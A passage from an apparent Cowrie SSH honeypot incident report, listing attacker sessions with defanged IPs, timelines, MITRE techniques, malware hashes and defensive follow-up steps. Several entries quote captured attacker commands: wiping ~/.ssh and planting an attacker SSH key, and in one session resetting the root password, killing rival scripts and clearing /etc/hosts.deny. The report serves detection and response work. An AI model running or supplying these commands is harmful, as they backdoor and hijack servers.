| `2026-06-09 19:32:32` | `cowrie.session.connect` |
| `2026-06-09 19:32:32` | `cowrie.client.version` |
| `2026-06-09 19:32:33` | `cowrie.client.kex` |
| `2026-06-09 19:32:34` | `cowrie.login.success` |
| `2026-06-09 19:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]140` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557c06828b93

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-06-09 19:36 |
| **Last Seen** | 2026-06-09 19:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:36:14` | `cowrie.session.connect` |
| `2026-06-09 19:36:14` | `cowrie.client.version` |
| `2026-06-09 19:36:14` | `cowrie.client.kex` |
| `2026-06-09 19:36:14` | `cowrie.login.success` |
| `2026-06-09 19:36:14` | `cowrie.session.params` |
| `2026-06-09 19:36:14` | `cowrie.command.input` |
| `2026-06-09 19:36:14` | `cowrie.command.failed` |
| `2026-06-09 19:36:14` | `cowrie.log.closed` |
| `2026-06-09 19:36:15` | `cowrie.session.params` |
| `2026-06-09 19:36:15` | `cowrie.command.input` |
| `2026-06-09 19:36:15` | `cowrie.session.file_download` |
| `2026-06-09 19:36:15` | `cowrie.log.closed` |
| `2026-06-09 19:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86bc5461205

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-06-09 19:36 |
| **Last Seen** | 2026-06-09 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:36:16` | `cowrie.session.connect` |
| `2026-06-09 19:36:16` | `cowrie.client.version` |
| `2026-06-09 19:36:16` | `cowrie.client.kex` |
| `2026-06-09 19:36:17` | `cowrie.login.success` |
| `2026-06-09 19:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249c950c37e2

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:36 |
| **Last Seen** | 2026-06-09 19:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:36:56` | `cowrie.session.connect` |
| `2026-06-09 19:36:56` | `cowrie.client.version` |
| `2026-06-09 19:36:57` | `cowrie.client.kex` |
| `2026-06-09 19:36:57` | `cowrie.login.success` |
| `2026-06-09 19:36:58` | `cowrie.session.params` |
| `2026-06-09 19:36:58` | `cowrie.command.input` |
| `2026-06-09 19:36:58` | `cowrie.command.failed` |
| `2026-06-09 19:36:58` | `cowrie.log.closed` |
| `2026-06-09 19:36:58` | `cowrie.session.params` |
| `2026-06-09 19:36:58` | `cowrie.command.input` |
| `2026-06-09 19:36:58` | `cowrie.session.file_download` |
| `2026-06-09 19:36:58` | `cowrie.log.closed` |
| `2026-06-09 19:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327d23fba90c

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:37 |
| **Last Seen** | 2026-06-09 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:37:02` | `cowrie.session.connect` |
| `2026-06-09 19:37:02` | `cowrie.client.version` |
| `2026-06-09 19:37:02` | `cowrie.client.kex` |
| `2026-06-09 19:37:02` | `cowrie.login.success` |
| `2026-06-09 19:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca3aa65d507

| Field | Detail |
|---|---|
| **Source IP** | `46.6.124[.]216` |
| **First Seen** | 2026-06-09 19:41 |
| **Last Seen** | 2026-06-09 19:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TkilRWWikkFR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:41:26` | `cowrie.session.connect` |
| `2026-06-09 19:41:26` | `cowrie.client.version` |
| `2026-06-09 19:41:27` | `cowrie.client.kex` |
| `2026-06-09 19:41:27` | `cowrie.login.success` |
| `2026-06-09 19:41:28` | `cowrie.session.params` |
| `2026-06-09 19:41:28` | `cowrie.command.input` |
| `2026-06-09 19:41:28` | `cowrie.command.failed` |
| `2026-06-09 19:41:28` | `cowrie.log.closed` |
| `2026-06-09 19:41:28` | `cowrie.session.params` |
| `2026-06-09 19:41:28` | `cowrie.command.input` |
| `2026-06-09 19:41:28` | `cowrie.session.file_download` |
| `2026-06-09 19:41:28` | `cowrie.log.closed` |
| `2026-06-09 19:41:29` | `cowrie.session.params` |
| `2026-06-09 19:41:29` | `cowrie.command.input` |
| `2026-06-09 19:41:29` | `cowrie.log.closed` |
| `2026-06-09 19:41:29` | `cowrie.session.params` |
| `2026-06-09 19:41:29` | `cowrie.command.input` |
| `2026-06-09 19:41:30` | `cowrie.log.closed` |
| `2026-06-09 19:41:30` | `cowrie.session.params` |
| `2026-06-09 19:41:30` | `cowrie.command.input` |
| `2026-06-09 19:41:30` | `cowrie.session.file_download` |
| `2026-06-09 19:41:30` | `cowrie.log.closed` |
| `2026-06-09 19:41:30` | `cowrie.session.params` |
| `2026-06-09 19:41:30` | `cowrie.command.input` |
| `2026-06-09 19:41:31` | `cowrie.log.closed` |
| `2026-06-09 19:41:31` | `cowrie.session.params` |
| `2026-06-09 19:41:31` | `cowrie.command.input` |
| `2026-06-09 19:41:31` | `cowrie.log.closed` |
| `2026-06-09 19:41:32` | `cowrie.session.params` |
| `2026-06-09 19:41:32` | `cowrie.command.input` |
| `2026-06-09 19:41:32` | `cowrie.command.input` |
| `2026-06-09 19:41:32` | `cowrie.log.closed` |
| `2026-06-09 19:41:32` | `cowrie.session.params` |
| `2026-06-09 19:41:32` | `cowrie.command.input` |
| `2026-06-09 19:41:32` | `cowrie.log.closed` |
| `2026-06-09 19:41:33` | `cowrie.session.params` |
| `2026-06-09 19:41:33` | `cowrie.command.input` |
| `2026-06-09 19:41:33` | `cowrie.log.closed` |
| `2026-06-09 19:41:33` | `cowrie.session.params` |
| `2026-06-09 19:41:33` | `cowrie.command.input` |
| `2026-06-09 19:41:34` | `cowrie.log.closed` |
| `2026-06-09 19:41:34` | `cowrie.session.params` |
| `2026-06-09 19:41:34` | `cowrie.command.input` |
| `2026-06-09 19:41:34` | `cowrie.log.closed` |
| `2026-06-09 19:41:34` | `cowrie.session.params` |
| `2026-06-09 19:41:34` | `cowrie.command.input` |
| `2026-06-09 19:41:35` | `cowrie.log.closed` |
| `2026-06-09 19:41:35` | `cowrie.session.params` |
| `2026-06-09 19:41:35` | `cowrie.command.input` |
| `2026-06-09 19:41:35` | `cowrie.log.closed` |
| `2026-06-09 19:41:35` | `cowrie.session.params` |
| `2026-06-09 19:41:35` | `cowrie.command.input` |
| `2026-06-09 19:41:36` | `cowrie.log.closed` |
| `2026-06-09 19:41:36` | `cowrie.session.params` |
| `2026-06-09 19:41:36` | `cowrie.command.input` |
| `2026-06-09 19:41:36` | `cowrie.log.closed` |
| `2026-06-09 19:41:37` | `cowrie.session.params` |
| `2026-06-09 19:41:37` | `cowrie.command.input` |
| `2026-06-09 19:41:37` | `cowrie.log.closed` |
| `2026-06-09 19:41:37` | `cowrie.session.params` |
| `2026-06-09 19:41:37` | `cowrie.command.input` |
| `2026-06-09 19:41:37` | `cowrie.log.closed` |
| `2026-06-09 19:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.124[.]216` to AbuseIPDB if not already reported
- [ ] Block `46.6.124[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c054a90936

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:41 |
| **Last Seen** | 2026-06-09 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:41:31` | `cowrie.session.connect` |
| `2026-06-09 19:41:31` | `cowrie.client.version` |
| `2026-06-09 19:41:32` | `cowrie.client.kex` |
| `2026-06-09 19:41:32` | `cowrie.login.success` |
| `2026-06-09 19:41:32` | `cowrie.session.params` |
| `2026-06-09 19:41:32` | `cowrie.command.input` |
| `2026-06-09 19:41:32` | `cowrie.command.failed` |
| `2026-06-09 19:41:33` | `cowrie.log.closed` |
| `2026-06-09 19:41:33` | `cowrie.session.params` |
| `2026-06-09 19:41:33` | `cowrie.command.input` |
| `2026-06-09 19:41:33` | `cowrie.session.file_download` |
| `2026-06-09 19:41:33` | `cowrie.log.closed` |
| `2026-06-09 19:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d225437842

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:41 |
| **Last Seen** | 2026-06-09 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:41:36` | `cowrie.session.connect` |
| `2026-06-09 19:41:36` | `cowrie.client.version` |
| `2026-06-09 19:41:36` | `cowrie.client.kex` |
| `2026-06-09 19:41:36` | `cowrie.login.success` |
| `2026-06-09 19:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-838a49f50e56

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-09 19:48 |
| **Last Seen** | 2026-06-09 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:48:36` | `cowrie.session.connect` |
| `2026-06-09 19:48:36` | `cowrie.client.version` |
| `2026-06-09 19:48:37` | `cowrie.client.kex` |
| `2026-06-09 19:48:37` | `cowrie.login.success` |
| `2026-06-09 19:48:38` | `cowrie.session.params` |
| `2026-06-09 19:48:38` | `cowrie.command.input` |
| `2026-06-09 19:48:38` | `cowrie.command.failed` |
| `2026-06-09 19:48:38` | `cowrie.log.closed` |
| `2026-06-09 19:48:38` | `cowrie.session.params` |
| `2026-06-09 19:48:38` | `cowrie.command.input` |
| `2026-06-09 19:48:38` | `cowrie.session.file_download` |
| `2026-06-09 19:48:38` | `cowrie.log.closed` |
| `2026-06-09 19:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691e52ee8f2b

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-09 19:48 |
| **Last Seen** | 2026-06-09 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:48:40` | `cowrie.session.connect` |
| `2026-06-09 19:48:40` | `cowrie.client.version` |
| `2026-06-09 19:48:41` | `cowrie.client.kex` |
| `2026-06-09 19:48:41` | `cowrie.login.success` |
| `2026-06-09 19:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf64c5f284f

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 19:59 |
| **Last Seen** | 2026-06-09 19:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:59:36` | `cowrie.session.connect` |
| `2026-06-09 19:59:36` | `cowrie.client.version` |
| `2026-06-09 19:59:36` | `cowrie.client.kex` |
| `2026-06-09 19:59:37` | `cowrie.login.success` |
| `2026-06-09 19:59:38` | `cowrie.session.params` |
| `2026-06-09 19:59:38` | `cowrie.command.input` |
| `2026-06-09 19:59:38` | `cowrie.command.failed` |
| `2026-06-09 19:59:38` | `cowrie.log.closed` |
| `2026-06-09 19:59:38` | `cowrie.session.params` |
| `2026-06-09 19:59:38` | `cowrie.command.input` |
| `2026-06-09 19:59:39` | `cowrie.session.file_download` |
| `2026-06-09 19:59:39` | `cowrie.log.closed` |
| `2026-06-09 19:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b6a673c4c7

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 19:59 |
| **Last Seen** | 2026-06-09 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:59:42` | `cowrie.session.connect` |
| `2026-06-09 19:59:42` | `cowrie.client.version` |
| `2026-06-09 19:59:42` | `cowrie.client.kex` |
| `2026-06-09 19:59:43` | `cowrie.login.success` |
| `2026-06-09 19:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1894ea4cb8

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 20:01 |
| **Last Seen** | 2026-06-09 20:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:01:44` | `cowrie.session.connect` |
| `2026-06-09 20:01:44` | `cowrie.client.version` |
| `2026-06-09 20:01:45` | `cowrie.client.kex` |
| `2026-06-09 20:01:46` | `cowrie.login.success` |
| `2026-06-09 20:01:46` | `cowrie.session.params` |
| `2026-06-09 20:01:46` | `cowrie.command.input` |
| `2026-06-09 20:01:46` | `cowrie.command.failed` |
| `2026-06-09 20:01:47` | `cowrie.log.closed` |
| `2026-06-09 20:01:47` | `cowrie.session.params` |
| `2026-06-09 20:01:47` | `cowrie.command.input` |
| `2026-06-09 20:01:47` | `cowrie.session.file_download` |
| `2026-06-09 20:01:47` | `cowrie.log.closed` |
| `2026-06-09 20:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38c6bc23ac9

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-06-09 20:01 |
| **Last Seen** | 2026-06-09 20:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:01:50` | `cowrie.session.connect` |
| `2026-06-09 20:01:50` | `cowrie.client.version` |
| `2026-06-09 20:01:50` | `cowrie.client.kex` |
| `2026-06-09 20:01:51` | `cowrie.login.success` |
| `2026-06-09 20:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524959cb9624

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 20:06 |
| **Last Seen** | 2026-06-09 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:06:19` | `cowrie.session.connect` |
| `2026-06-09 20:06:19` | `cowrie.client.version` |
| `2026-06-09 20:06:19` | `cowrie.client.kex` |
| `2026-06-09 20:06:20` | `cowrie.login.success` |
| `2026-06-09 20:06:20` | `cowrie.session.params` |
| `2026-06-09 20:06:20` | `cowrie.command.input` |
| `2026-06-09 20:06:20` | `cowrie.command.failed` |
| `2026-06-09 20:06:20` | `cowrie.log.closed` |
| `2026-06-09 20:06:20` | `cowrie.session.params` |
| `2026-06-09 20:06:20` | `cowrie.command.input` |
| `2026-06-09 20:06:20` | `cowrie.session.file_download` |
| `2026-06-09 20:06:20` | `cowrie.log.closed` |
